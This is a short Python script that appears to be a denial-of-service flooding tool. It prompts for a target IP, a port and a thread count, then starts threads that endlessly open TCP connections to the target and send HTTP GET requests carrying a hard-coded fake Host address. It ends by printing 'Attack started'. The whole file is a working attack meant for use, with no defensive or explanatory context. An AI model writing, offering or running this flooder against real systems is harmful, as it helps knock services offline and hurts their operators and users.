import socket
import threading
target = input("Insert target’s IP: ")
port = int(input("Insert Port: "))
Trd = int(input("Insert number of Threads: "))
fake_ip = '44.197.175.168'
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        except socket.error as e:
            print(f"Error: {e}")
        finally:
            s.close()
for i in range(Trd):
    thread = threading.Thread(target=attack)
    thread.start()
    attack_num += 1
print("Attack started with", attack_num, "threads.")